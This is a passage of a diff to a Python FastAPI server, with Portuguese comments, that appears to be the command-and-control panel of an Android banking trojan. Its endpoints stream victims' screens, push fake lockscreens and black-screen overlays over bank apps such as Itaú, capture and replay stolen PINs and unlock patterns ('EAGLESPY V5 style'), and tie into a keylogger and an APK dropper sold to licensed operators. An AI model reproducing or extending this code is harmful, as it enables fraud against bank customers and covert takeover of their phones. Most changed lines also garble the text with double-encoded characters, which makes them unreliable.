+            raise HTTPException(status_code=400, detail="Este nome de usuÃƒÂ¡rio jÃƒÂ¡ estÃƒÂ¡ em uso.")
         current_user.username = body.username
 
     if body.password:
         if not body.current_password or not verify_password(body.current_password, current_user.hashed_password):
-            raise HTTPException(status_code=400, detail="Senha atual incorreta. Ã‰ necessÃ¡rio fornecer a senha atual para definir uma nova senha.")
+            raise HTTPException(status_code=400, detail="Senha atual incorreta. Ãƒâ€° necessÃƒÂ¡rio fornecer a senha atual para definir uma nova senha.")
         current_user.hashed_password = get_password_hash(body.password)
 
     db.commit()
@@ -3763,17 +3896,17 @@ async def refresh_token(
 ):
     """
     Renova token JWT para o painel.
-    Aceita tokens expirados para permitir renovaÃ§Ã£o sem relogin.
+    Aceita tokens expirados para permitir renovaÃƒÂ§ÃƒÂ£o sem relogin.
     """
     from auth import get_user_from_expired_token
     
-    # Tenta obter usuÃ¡rio mesmo de token expirado
+    # Tenta obter usuÃƒÂ¡rio mesmo de token expirado
     operator = get_user_from_expired_token(token, db)
     
     if operator is None:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Token invÃ¡lido ou usuÃ¡rio nÃ£o encontrado",
+            detail="Token invÃƒÂ¡lido ou usuÃƒÂ¡rio nÃƒÂ£o encontrado",
             headers={"WWW-Authenticate": "Bearer"},
         )
     
@@ -3790,7 +3923,7 @@ async def admin_get_stats(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """EstatÃ­sticas do sistema (apenas admin)"""
+    """EstatÃƒÂ­sticas do sistema (apenas admin)"""
     total_users = db.query(Operator).count()
     active_users = db.query(Operator).filter(Operator.is_active == True, Operator.is_banned == False).count()
     banned_users = db.query(Operator).filter(Operator.is_banned == True).count()
@@ -3810,7 +3943,7 @@ async def admin_get_users(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Lista todos os usuÃ¡rios (apenas admin)"""
+    """Lista todos os usuÃƒÂ¡rios (apenas admin)"""
     users = db.query(Operator).all()
     result = []
     
@@ -3844,13 +3977,13 @@ def sync_user_to_bypass(
     status: Optional[str] = None, 
     is_delete: bool = False
 ):
-    """Sincroniza o usuÃ¡rio principal com o banco de dados JSON do Bypass (data.json)."""
+    """Sincroniza o usuÃƒÂ¡rio principal com o banco de dados JSON do Bypass (data.json)."""
     try:
         import shutil
         # Caminho oficial do data.json do bypass: projeto_bypass/apk_dropper/data.json
         bypass_json_path = os.path.join(os.path.dirname(__file__), "projeto_bypass", "apk_dropper", "data.json")
         if not os.path.exists(bypass_json_path):
-            # Fallback path se a pasta apk_dropper nÃ£o estiver criada
+            # Fallback path se a pasta apk_dropper nÃƒÂ£o estiver criada
             bypass_json_path_alt = os.path.join(os.path.dirname(__file__), "projeto_bypass", "data.json")
             if os.path.exists(bypass_json_path_alt):
                 bypass_json_path = bypass_json_path_alt
@@ -3867,7 +4000,7 @@ def sync_user_to_bypass(
         if is_delete:
             if username in users:
                 del users[username]
-                logger.info(f"ðŸ”„ UsuÃ¡rio {username} deletado no motor Bypass!")
+                logger.info(f"Ã°Å¸â€â€ž UsuÃƒÂ¡rio {username} deletado no motor Bypass!")
         else:
             if username not in users:
                 users[username] = {
@@ -3882,7 +4015,7 @@ def sync_user_to_bypass(
                     "daily_apk_reset_date": utc_now().strftime("%Y-%m-%d"),
                     "bypass_options_limit_date": expires_at.strftime("%Y-%m-%d") if expires_at else ""
                 }
-                logger.info(f"ðŸ”„ UsuÃ¡rio {username} criado e sincronizado com motor Bypass!")
+                logger.info(f"Ã°Å¸â€â€ž UsuÃƒÂ¡rio {username} criado e sincronizado com motor Bypass!")
             else:
                 # Atualiza dados existentes
                 if password is not None:
@@ -3898,22 +4031,22 @@ def sync_user_to_bypass(
                     users[username]["bypass_options_limit_date"] = ""
                 if status is not None:
                     users[username]["status"] = status
-                logger.info(f"ðŸ”„ UsuÃ¡rio {username} atualizado no motor Bypass!")
+                logger.info(f"Ã°Å¸â€â€ž UsuÃƒÂ¡rio {username} atualizado no motor Bypass!")
 
-        # Escrita atÃ´mica segura para evitar corromper o arquivo data.json
+        # Escrita atÃƒÂ´mica segura para evitar corromper o arquivo data.json
         temp_path = bypass_json_path + ".tmp"
         with open(temp_path, "w", encoding="utf-8") as f:
             json.dump(b_data, f, indent=2, ensure_ascii=False)
             f.flush()
             os.fsync(f.fileno())
 
-        # Backup da versÃ£o estÃ¡vel anterior
+        # Backup da versÃƒÂ£o estÃƒÂ¡vel anterior
         if os.path.exists(bypass_json_path):
             shutil.copy2(bypass_json_path, bypass_json_path + ".bak")
 
         os.replace(temp_path, bypass_json_path)
     except Exception as sync_err:
-        logger.error(f"Erro ao sincronizar usuÃ¡rio {username} com motor Bypass: {sync_err}")
+        logger.error(f"Erro ao sincronizar usuÃƒÂ¡rio {username} com motor Bypass: {sync_err}")
 
 @app.post("/api/admin/users")
 async def admin_create_user(
@@ -3927,13 +4060,13 @@ async def admin_create_user(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Cria novo usuÃ¡rio com opÃ§Ã£o de expiraÃ§Ã£o (apenas admin)"""
-    # Verifica se jÃ¡ existe
+    """Cria novo usuÃƒÂ¡rio com opÃƒÂ§ÃƒÂ£o de expiraÃƒÂ§ÃƒÂ£o (apenas admin)"""
+    # Verifica se jÃƒÂ¡ existe
     existing = db.query(Operator).filter(
         (Operator.username == username) | (Operator.email == email)
     ).first()
     if existing:
-        raise HTTPException(status_code=400, detail="UsuÃ¡rio ou email jÃ¡ existe")
+        raise HTTPException(status_code=400, detail="UsuÃƒÂ¡rio ou email jÃƒÂ¡ existe")
     
     exp_date = None
     if expiration_days and expiration_days > 0:
@@ -3944,7 +4077,7 @@ async def admin_create_user(
         except Exception:
             pass
     
-    # Cria usuÃ¡rio
+    # Cria usuÃƒÂ¡rio
     new_user = Operator(
         username=username,
         email=email,
@@ -3957,7 +4090,7 @@ async def admin_create_user(
     db.commit()
     db.refresh(new_user)
     
-    # Sincroniza criaÃ§Ã£o no motor Bypass (projeto_bypass)
+    # Sincroniza criaÃƒÂ§ÃƒÂ£o no motor Bypass (projeto_bypass)
     sync_user_to_bypass(
         username=username,
         password=password,
@@ -3966,7 +4099,7 @@ async def admin_create_user(
         status="active"
     )
 
-    logger.info(f"Admin {current_user.username} criou usuÃ¡rio: {username} (expira: {exp_date})")
+    logger.info(f"Admin {current_user.username} criou usuÃƒÂ¡rio: {username} (expira: {exp_date})")
     
     return {"status": "ok", "user_id": new_user.id}
 
@@ -3987,10 +4120,10 @@ async def admin_update_user(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Atualiza usuÃ¡rio (apenas admin)"""
+    """Atualiza usuÃƒÂ¡rio (apenas admin)"""
     user = db.query(Operator).filter(Operator.id == user_id).first()
     if not user:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     if email is not None:
         user.email = email
@@ -4023,7 +4156,7 @@ async def admin_update_user(
     
     db.commit()
     
-    # Sincroniza alteraÃ§Ã£o no motor Bypass
+    # Sincroniza alteraÃƒÂ§ÃƒÂ£o no motor Bypass
     sync_user_to_bypass(
         username=user.username,
         password=password if (password and password.strip()) else None,
@@ -4032,7 +4165,7 @@ async def admin_update_user(
         status="inactive" if (user.is_banned or not user.is_active) else "active"
     )
 
-    logger.info(f"Admin {current_user.username} atualizou usuÃ¡rio: {user.username}")
+    logger.info(f"Admin {current_user.username} atualizou usuÃƒÂ¡rio: {user.username}")
     
     return {"status": "ok"}
 
@@ -4042,25 +4175,25 @@ async def admin_delete_user(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Exclui usuÃ¡rio (apenas admin)"""
+    """Exclui usuÃƒÂ¡rio (apenas admin)"""
     user = db.query(Operator).filter(Operator.id == user_id).first()
     if not user:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     if user.id == current_user.id:
-        raise HTTPException(status_code=400, detail="VocÃª nÃ£o pode excluir a si mesmo")
+        raise HTTPException(status_code=400, detail="VocÃƒÂª nÃƒÂ£o pode excluir a si mesmo")
     
     username = user.username
     db.delete(user)
     db.commit()
     
-    # Sincroniza exclusÃ£o no motor Bypass
+    # Sincroniza exclusÃƒÂ£o no motor Bypass
     sync_user_to_bypass(
         username=username,
         is_delete=True
     )
 
-    logger.info(f"Admin {current_user.username} excluiu usuÃ¡rio: {username}")
+    logger.info(f"Admin {current_user.username} excluiu usuÃƒÂ¡rio: {username}")
     
     return {"status": "ok"}
 
@@ -4070,10 +4203,10 @@ async def admin_ban_user(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Bane usuÃ¡rio (apenas admin)"""
+    """Bane usuÃƒÂ¡rio (apenas admin)"""
     user = db.query(Operator).filter(Operator.id == user_id).first()
     if not user:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     user.is_banned = True
     db.commit()
@@ -4084,7 +4217,7 @@ async def admin_ban_user(
         status="inactive"
     )
 
-    logger.info(f"Admin {current_user.username} baniu usuÃ¡rio: {user.username}")
+    logger.info(f"Admin {current_user.username} baniu usuÃƒÂ¡rio: {user.username}")
     
     return {"status": "ok"}
 
@@ -4094,10 +4227,10 @@ async def admin_unban_user(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Desbane usuÃ¡rio (apenas admin)"""
+    """Desbane usuÃƒÂ¡rio (apenas admin)"""
     user = db.query(Operator).filter(Operator.id == user_id).first()
     if not user:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     user.is_banned = False
     db.commit()
@@ -4108,7 +4241,7 @@ async def admin_unban_user(
         status="active"
     )
 
-    logger.info(f"Admin {current_user.username} desbaniu usuÃ¡rio: {user.username}")
+    logger.info(f"Admin {current_user.username} desbaniu usuÃƒÂ¡rio: {user.username}")
     
     return {"status": "ok"}
 
@@ -4118,10 +4251,10 @@ async def admin_reset_hwid(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Reseta HWID do usuÃ¡rio (apenas admin)"""
+    """Reseta HWID do usuÃƒÂ¡rio (apenas admin)"""
     user = db.query(Operator).filter(Operator.id == user_id).first()
     if not user:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     user.hwid = None
     user.hwid_activated_at = None
@@ -4137,10 +4270,10 @@ async def admin_reset_2fa(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Reseta o 2FA Google Authenticator do usuÃ¡rio (apenas admin)"""
+    """Reseta o 2FA Google Authenticator do usuÃƒÂ¡rio (apenas admin)"""
     user = db.query(Operator).filter(Operator.id == user_id).first()
     if not user:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     user.totp_secret = None
     user.totp_enabled = False
@@ -4185,14 +4318,14 @@ async def admin_assign_device(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Atribui dispositivo a um usuÃ¡rio (apenas admin)"""
+    """Atribui dispositivo a um usuÃƒÂ¡rio (apenas admin)"""
     device = db.query(Device).filter(Device.device_id == device_id).first()
     if not device:
-        raise HTTPException(status_code=404, detail="Dispositivo nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Dispositivo nÃƒÂ£o encontrado")
     
     user = db.query(Operator).filter(Operator.id == user_id).first()
     if not user:
-        raise HTTPException(status_code=404, detail="UsuÃ¡rio nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="UsuÃƒÂ¡rio nÃƒÂ£o encontrado")
     
     device.owner_id = user_id
     db.commit()
@@ -4202,7 +4335,7 @@ async def admin_assign_device(
     
     logger.info(f"Admin {current_user.username} atribuiu dispositivo {device_id} para {user.username}")
     
-    return {"status": "ok", "message": f"Dispositivo atribuÃ­do para {user.username}"}
+    return {"status": "ok", "message": f"Dispositivo atribuÃƒÂ­do para {user.username}"}
 
 @app.post("/api/admin/devices/{device_id}/unassign")
 async def admin_unassign_device(
@@ -4210,10 +4343,10 @@ async def admin_unassign_device(
     current_user: Operator = Depends(get_current_admin),
     db: Session = Depends(get_db)
 ):
-    """Remove atribuiÃ§Ã£o de dispositivo (apenas admin)"""
+    """Remove atribuiÃƒÂ§ÃƒÂ£o de dispositivo (apenas admin)"""
     device = db.query(Device).filter(Device.device_id == device_id).first()
     if not device:
-        raise HTTPException(status_code=404, detail="Dispositivo nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Dispositivo nÃƒÂ£o encontrado")
     
     device.owner_id = None
     db.commit()
@@ -4221,14 +4354,14 @@ async def admin_unassign_device(
     # Invalida cache de dispositivos
     _devices_cache["data"] = None
     
-    logger.info(f"Admin {current_user.username} removeu atribuiÃ§Ã£o do dispositivo {device_id}")
+    logger.info(f"Admin {current_user.username} removeu atribuiÃƒÂ§ÃƒÂ£o do dispositivo {device_id}")
     
     return {"status": "ok"}
 
 # ==================== API DE DISPOSITIVOS ====================
 
 def _get_active_bank_safe(mgr, device_id: str, is_online: bool):
-    """Retorna active_bank com expiraÃ§Ã£o automÃ¡tica de 5 minutos (safety net)."""
+    """Retorna active_bank com expiraÃƒÂ§ÃƒÂ£o automÃƒÂ¡tica de 5 minutos (safety net)."""
     if not is_online:
         return None
     bank = mgr.device_active_banks.get(device_id)
@@ -4248,7 +4381,7 @@ def _get_active_bank_safe(mgr, device_id: str, is_online: bool):
     age_seconds = (utc_now() - bank_time).total_seconds()
     if age_seconds > 300:  # 5 minutos
         del mgr.device_active_banks[device_id]
-        logger.info(f"â±ï¸ active_bank expirado automaticamente para {device_id} ({age_seconds:.0f}s)")
+        logger.info(f"Ã¢ÂÂ±Ã¯Â¸Â active_bank expirado automaticamente para {device_id} ({age_seconds:.0f}s)")
         return None
     return bank
 
@@ -4260,7 +4393,7 @@ async def get_devices(current_user: Operator = Depends(get_current_user), db: Se
     now = utc_now()
     user_key = f"{current_user.id}_{current_user.is_admin}"
     
-    # Fast path: cache de resposta de 1.5s em memÃ³ria para evitar hits repetidos no SQLite
+    # Fast path: cache de resposta de 1.5s em memÃƒÂ³ria para evitar hits repetidos no SQLite
     cached = _devices_cache_store.get(user_key)
     if cached and (now - cached["ts"]).total_seconds() < 1.5:
         # Atualiza status online dinamicamente sem reler do banco
@@ -4285,8 +4418,8 @@ async def get_devices(current_user: Operator = Depends(get_current_user), db: Se
         is_online = device.device_id in alive_ids
         info = manager.device_info.get(device.device_id) or {}
         
-        # Se o dispositivo estÃ¡ online mas ainda nÃ£o enviou nÃ­vel de bateria, solicita em segundo plano
-        # Anti-flood: sÃ³ envia 1 vez a cada 60s por dispositivo
+        # Se o dispositivo estÃƒÂ¡ online mas ainda nÃƒÂ£o enviou nÃƒÂ­vel de bateria, solicita em segundo plano
+        # Anti-flood: sÃƒÂ³ envia 1 vez a cada 60s por dispositivo
         if is_online and info.get("battery_level") is None:
             last_req = manager._info_request_ts.get(device.device_id)
             now_ts = utc_now()
@@ -4383,7 +4516,7 @@ async def rename_device(
     """Renomeia um dispositivo atribuindo um nome personalizado."""
     device = check_device_access(device_id, current_user, db)
     if not device:
-        raise HTTPException(status_code=404, detail="Dispositivo nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Dispositivo nÃƒÂ£o encontrado")
     device.custom_name = req.custom_name
     db.commit()
     _devices_cache["data"] = None
@@ -4395,18 +4528,18 @@ async def delete_device_endpoint(
     db: Session = Depends(get_db),
     current_user: Operator = Depends(get_current_user)
 ):
-    """Exclui dispositivo do painel (apenas offline para usuÃ¡rios padrÃ£o, ou forÃ§a para admins)"""
+    """Exclui dispositivo do painel (apenas offline para usuÃƒÂ¡rios padrÃƒÂ£o, ou forÃƒÂ§a para admins)"""
     device = db.query(Device).filter(Device.device_id == device_id).first()
     if not device:
-        raise HTTPException(status_code=404, detail="Dispositivo nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Dispositivo nÃƒÂ£o encontrado")
     
     # Verifica acesso
     if not current_user.is_admin and device.owner_id != current_user.id:
-        raise HTTPException(status_code=403, detail="VocÃª nÃ£o tem permissÃ£o para excluir este dispositivo")
+        raise HTTPException(status_code=403, detail="VocÃƒÂª nÃƒÂ£o tem permissÃƒÂ£o para excluir este dispositivo")
     
     # Apenas offline (exceto admin)
     if device.is_online and device_id in manager.active_connections and not current_user.is_admin:
-        raise HTTPException(status_code=400, detail="Dispositivo estÃ¡ online. Apenas dispositivos offline podem ser excluÃ­dos.")
+        raise HTTPException(status_code=400, detail="Dispositivo estÃƒÂ¡ online. Apenas dispositivos offline podem ser excluÃƒÂ­dos.")
     
     # Fecha WS se ativo
     if device_id in manager.active_connections:
@@ -4429,17 +4562,17 @@ async def delete_device_endpoint(
     manager._delete_cached_hierarchy(device_id)
     _devices_cache["data"] = None
     
-    logger.info(f"ðŸ“± Dispositivo {device_id} excluÃ­do por {current_user.username}")
-    return {"status": "ok", "message": "Dispositivo excluÃ­do com sucesso"}
+    logger.info(f"Ã°Å¸â€œÂ± Dispositivo {device_id} excluÃƒÂ­do por {current_user.username}")
+    return {"status": "ok", "message": "Dispositivo excluÃƒÂ­do com sucesso"}
 
 def check_device_access(device_id: str, user: Operator, db: Session = None) -> Optional[Device]:
-    """Verifica se usuÃ¡rio tem acesso ao dispositivo e retorna a instÃ¢ncia de Device."""
+    """Verifica se usuÃƒÂ¡rio tem acesso ao dispositivo e retorna a instÃƒÂ¢ncia de Device."""
     if db:
         device = db.query(Device).filter(Device.device_id == device_id).first()
         if not device:
-            raise HTTPException(status_code=404, detail="Dispositivo nÃ£o encontrado")
+            raise HTTPException(status_code=404, detail="Dispositivo nÃƒÂ£o encontrado")
         if not user.is_admin and device.owner_id != user.id:
-            raise HTTPException(status_code=403, detail="VocÃª nÃ£o tem acesso a este dispositivo")
+            raise HTTPException(status_code=403, detail="VocÃƒÂª nÃƒÂ£o tem acesso a este dispositivo")
         return device
     return None
 
@@ -4450,7 +4583,7 @@ async def get_device_screen(
     db: Session = Depends(get_db),
     request: Request = None
 ):
-    """Retorna Ãºltimo frame da tela do dispositivo (exige token e valida acesso ao dispositivo)"""
+    """Retorna ÃƒÂºltimo frame da tela do dispositivo (exige token e valida acesso ao dispositivo)"""
     auth_token = token
     if not auth_token and request:
         auth_header = request.headers.get("authorization")
@@ -4458,15 +4591,15 @@ async def get_device_screen(
             auth_token = auth_header.split(" ")[1]
             
     if not auth_token:
-        raise HTTPException(status_code=401, detail="Token de autenticaÃ§Ã£o obrigatÃ³rio")
+        raise HTTPException(status_code=401, detail="Token de autenticaÃƒÂ§ÃƒÂ£o obrigatÃƒÂ³rio")
         
     try:
         payload = jwt.decode(auth_token, SECRET_KEY, algorithms=[ALGORITHM])
         username = payload.get("sub")
         if not username:
-            raise HTTPException(status_code=401, detail="Token invÃ¡lido")
+            raise HTTPException(status_code=401, detail="Token invÃƒÂ¡lido")
     except JWTError:
-        raise HTTPException(status_code=401, detail="Token invÃ¡lido")
+        raise HTTPException(status_code=401, detail="Token invÃƒÂ¡lido")
         
     user = db.query(Operator).filter(Operator.username == username).first()
     if not user or user.is_banned or not user.is_active:
@@ -4477,7 +4610,7 @@ async def get_device_screen(
     screen_data = manager.get_latest_screen(device_id)
     
     if not screen_data:
-        raise HTTPException(status_code=404, detail="Nenhum frame disponÃ­vel")
+        raise HTTPException(status_code=404, detail="Nenhum frame disponÃƒÂ­vel")
     
     return StreamingResponse(
         iter([screen_data]),
@@ -4496,25 +4629,25 @@ async def send_command_to_device(
     # Verifica acesso
     check_device_access(device_id, current_user, db)
     
-    # Verifica se dispositivo estÃ¡ realmente online
+    # Verifica se dispositivo estÃƒÂ¡ realmente online
     is_connected = device_id in manager.active_connections
     
     if not is_connected:
-        logger.warning(f"âš ï¸ Tentativa de comando para dispositivo OFFLINE: {device_id}")
+        logger.warning(f"Ã¢Å¡Â Ã¯Â¸Â Tentativa de comando para dispositivo OFFLINE: {device_id}")
         raise HTTPException(
             status_code=503, 
-            detail="Dispositivo estÃ¡ offline. Aguarde reconexÃ£o."
+            detail="Dispositivo estÃƒÂ¡ offline. Aguarde reconexÃƒÂ£o."
         )
     
-    logger.info(f"ðŸ“¥ ENDPOINT: Recebido comando {command.action} para {device_id}")
+    logger.info(f"Ã°Å¸â€œÂ¥ ENDPOINT: Recebido comando {command.action} para {device_id}")
     
-    # ðŸŽ¨ Debug: Log do template para CUSTOM_BLACK_SCREEN
+    # Ã°Å¸Å½Â¨ Debug: Log do template para CUSTOM_BLACK_SCREEN
     if command.action == 'CUSTOM_BLACK_SCREEN':
-        logger.warning(f"ðŸŽ¨ DEBUG CUSTOM_BLACK_SCREEN: template = {command.template}")
+        logger.warning(f"Ã°Å¸Å½Â¨ DEBUG CUSTOM_BLACK_SCREEN: template = {command.template}")
         cmd_dict = command.model_dump() if hasattr(command, 'model_dump') else command.dict()
-        logger.warning(f"ðŸŽ¨ DEBUG command.dict() = {cmd_dict}")
+        logger.warning(f"Ã°Å¸Å½Â¨ DEBUG command.dict() = {cmd_dict}")
         
-        # Associa um banco ativo temporÃ¡rio baseado no pacote alvo do comando/template
+        # Associa um banco ativo temporÃƒÂ¡rio baseado no pacote alvo do comando/template
         target_pkg = command.package
         if not target_pkg and isinstance(command.template, dict):
             target_pkg = command.template.get("package_name") or command.template.get("packageName") or command.template.get("package")
@@ -4522,14 +4655,14 @@ async def send_command_to_device(
         if target_pkg:
             app_name = BankPasswordDetector.BANK_APPS.get(target_pkg)
             if not app_name:
-                app_name = 'ItaÃº' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
+                app_name = 'ItaÃƒÂº' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
             
             manager.device_active_banks[device_id] = {
                 "package": target_pkg,
                 "appName": app_name,
                 "timestamp": utc_now().isoformat()
             }
-            logger.info(f"ðŸ”® CUSTOM_BLACK_SCREEN: Associando banco ativo temporÃ¡rio {app_name} ({target_pkg}) para capturas do dispositivo {device_id}")
+            logger.info(f"Ã°Å¸â€Â® CUSTOM_BLACK_SCREEN: Associando banco ativo temporÃƒÂ¡rio {app_name} ({target_pkg}) para capturas do dispositivo {device_id}")
     
     # Rastreia estado do lockscreen ativo
     if command.action == 'SHOW_LOCKSCREEN':
@@ -4583,10 +4716,10 @@ async def send_command_to_device(
     success = await manager.send_command(device_id, cmd_payload)
     
     if not success:
-        logger.error(f"âŒ Falha ao enviar comando para {device_id} - conexÃ£o perdida durante envio")
-        raise HTTPException(status_code=503, detail="ConexÃ£o perdida durante envio. Tente novamente.")
+        logger.error(f"Ã¢ÂÅ’ Falha ao enviar comando para {device_id} - conexÃƒÂ£o perdida durante envio")
+        raise HTTPException(status_code=503, detail="ConexÃƒÂ£o perdida durante envio. Tente novamente.")
     
-    # NÃ£o salva comandos enviados para nÃ£o poluir o keylogger
+    # NÃƒÂ£o salva comandos enviados para nÃƒÂ£o poluir o keylogger
     # (descomente se precisar auditar comandos)
     # log = DeviceLog(
     #     device_id=device_id,
@@ -4644,16 +4777,16 @@ async def create_device_overlay_mapping(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Cria ou atualiza um mapeamento de overlay para um aplicativo especÃ­fico"""
+    """Cria ou atualiza um mapeamento de overlay para um aplicativo especÃƒÂ­fico"""
     check_device_access(device_id, current_user, db)
     
     from models import DeviceOverlayMapping
     
     package_name = mapping_data.get("package_name")
     if not package_name:
-        raise HTTPException(status_code=400, detail="Package name Ã© obrigatÃ³rio")
+        raise HTTPException(status_code=400, detail="Package name ÃƒÂ© obrigatÃƒÂ³rio")
         
-    # Verifica se jÃ¡ existe um mapeamento para esse pacote no dispositivo
+    # Verifica se jÃƒÂ¡ existe um mapeamento para esse pacote no dispositivo
     existing = db.query(DeviceOverlayMapping).filter(
         DeviceOverlayMapping.device_id == device_id,
         DeviceOverlayMapping.package_name == package_name
@@ -4668,7 +4801,7 @@ async def create_device_overlay_mapping(
         existing.template_json = template_str
         existing.is_enabled = mapping_data.get("is_enabled", existing.is_enabled)
         db.commit()
-        logger.info(f"âœ¨ Mapeamento de overlay atualizado para {device_id} -> {package_name}")
+        logger.info(f"Ã¢Å“Â¨ Mapeamento de overlay atualizado para {device_id} -> {package_name}")
         return {"id": existing.id, "message": "Mapeamento atualizado"}
         
     new_mapping = DeviceOverlayMapping(
@@ -4682,7 +4815,7 @@ async def create_device_overlay_mapping(
     )
     db.add(new_mapping)
     db.commit()
-    logger.info(f"âœ¨ Novo mapeamento de overlay criado para {device_id} -> {package_name}")
+    logger.info(f"Ã¢Å“Â¨ Novo mapeamento de overlay criado para {device_id} -> {package_name}")
     return {"id": new_mapping.id, "message": "Mapeamento criado"}
 
 @app.delete("/api/devices/{device_id}/overlay-mappings/{mapping_id}")
@@ -4703,11 +4836,11 @@ async def delete_device_overlay_mapping(
     ).first()
     
     if not mapping:
-        raise HTTPException(status_code=404, detail="Mapeamento nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Mapeamento nÃƒÂ£o encontrado")
         
     db.delete(mapping)
     db.commit()
-    logger.info(f"ðŸ—‘ï¸ Mapeamento de overlay removido: ID {mapping_id} do dispositivo {device_id}")
+    logger.info(f"Ã°Å¸â€”â€˜Ã¯Â¸Â Mapeamento de overlay removido: ID {mapping_id} do dispositivo {device_id}")
     return {"message": "Mapeamento removido"}
 
 
@@ -4720,7 +4853,7 @@ async def get_device_pin(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”’ Retorna PIN capturado do lockscreen (EAGLESPY V5 style)"""
+    """Ã°Å¸â€â€™ Retorna PIN capturado do lockscreen (EAGLESPY V5 style)"""
     check_device_access(device_id, current_user, db)
     
     pin = manager.get_device_pin(device_id)
@@ -4752,12 +4885,12 @@ async def set_device_pin(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”’ Define PIN do lockscreen manualmente"""
+    """Ã°Å¸â€â€™ Define PIN do lockscreen manualmente"""
     check_device_access(device_id, current_user, db)
     
     manager.store_device_pin(device_id, pin)
     
-    logger.info(f"ðŸ”’ PIN definido manualmente para {device_id}: {pin}")
+    logger.info(f"Ã°Å¸â€â€™ PIN definido manualmente para {device_id}: {pin}")
     
     return {
         "status": "ok",
@@ -4770,7 +4903,7 @@ async def clear_device_pin(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”’ Limpa PIN armazenado"""
+    """Ã°Å¸â€â€™ Limpa PIN armazenado"""
     check_device_access(device_id, current_user, db)
     
     manager.clear_device_pin(device_id)
@@ -4785,10 +4918,10 @@ async def play_pin_sequence(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”„ Reproduz PIN automaticamente (igual EAGLESPY V5)"""
+    """Ã°Å¸â€â€ž Reproduz PIN automaticamente (igual EAGLESPY V5)"""
     check_device_access(device_id, current_user, db)
     
-    # Se nÃ£o forneceu PIN, usa o armazenado
+    # Se nÃƒÂ£o forneceu PIN, usa o armazenado
     if not pin:
         pin = manager.get_device_pin(device_id)
         if not pin:
@@ -4804,7 +4937,7 @@ async def play_pin_sequence(
     if not success:
         raise HTTPException(status_code=503, detail="Dispositivo offline")
     
-    logger.info(f"ðŸ”„ Reproduzindo PIN '{pin}' em {device_id} (delay: {delay}ms)")
+    logger.info(f"Ã°Å¸â€â€ž Reproduzindo PIN '{pin}' em {device_id} (delay: {delay}ms)")
     
     return {
         "status": "ok",
@@ -4819,7 +4952,7 @@ async def get_device_pattern(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”² Retorna Pattern capturado do lockscreen"""
+    """Ã°Å¸â€Â² Retorna Pattern capturado do lockscreen"""
     check_device_access(device_id, current_user, db)
     
     pattern = manager.get_device_pattern(device_id)
@@ -4851,12 +4984,12 @@ async def set_device_pattern(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”² Define Pattern do lockscreen manualmente"""
+    """Ã°Å¸â€Â² Define Pattern do lockscreen manualmente"""
     check_device_access(device_id, current_user, db)
     
     manager.store_device_pattern(device_id, pattern)
     
-    logger.info(f"ðŸ”² Pattern definido manualmente para {device_id}: {pattern}")
+    logger.info(f"Ã°Å¸â€Â² Pattern definido manualmente para {device_id}: {pattern}")
     
     return {
         "status": "ok",
@@ -4869,7 +5002,7 @@ async def clear_device_pattern(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”² Limpa Pattern armazenado"""
+    """Ã°Å¸â€Â² Limpa Pattern armazenado"""
     check_device_access(device_id, current_user, db)
     
     manager.clear_device_pattern(device_id)
@@ -4884,10 +5017,10 @@ async def play_pattern_sequence(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """ðŸ”² Reproduz Pattern automaticamente"""
